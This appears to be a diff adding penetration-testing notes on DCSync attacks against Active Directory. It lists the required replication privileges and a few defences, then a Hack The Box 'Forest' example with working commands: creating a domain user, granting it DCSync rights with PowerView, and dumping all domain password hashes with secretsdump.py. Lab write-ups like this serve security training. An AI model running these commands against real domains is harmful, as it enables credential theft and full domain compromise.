@@ -1,0 +1,22 @@
+#Key Points
+    - DCSync attacks allow an attacker to impersonate a domain controller and request password hashes from other domain controllers
+    - Only accounts that have certain replication permissions with Active Directory can be targeted and used in a DCSync attack.
+    - DCSync attacks enable an attacker to target a domain controller without having to log on to or place code on the controller.
+    -> Monitoring network traffic, and controlling replication permissions, are the best strategies to combat DCSync attacks.
+    
+#Ultimate requirements
+     - Compromised user with privileges:
+        . Replicating Directory Changes All 
+        . Replicating Directory Changes 
+  (Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default)
+  
+  example: Forest - Hackthebox
+  The group to which the user belongs has WriteDACL permission to htb.local -> To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges, which will give us the right to perform domain replication and dump all the password hashes from the domain.
+    - net user rana password /add /domain
+      net group "Exchange Windows Permissions" /add rana
+    - import-module .\PowerView.ps1
+      $pass = convertto-securestring 'password' -AsPlainText -Force
+      $cred = New-Object System.Management.Automation.PSCredential('htb\rana', $pass)
+      Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rana -Rights DCSync
+    - secretsdump.py htb.local/rana:password@10.10.10.161
+
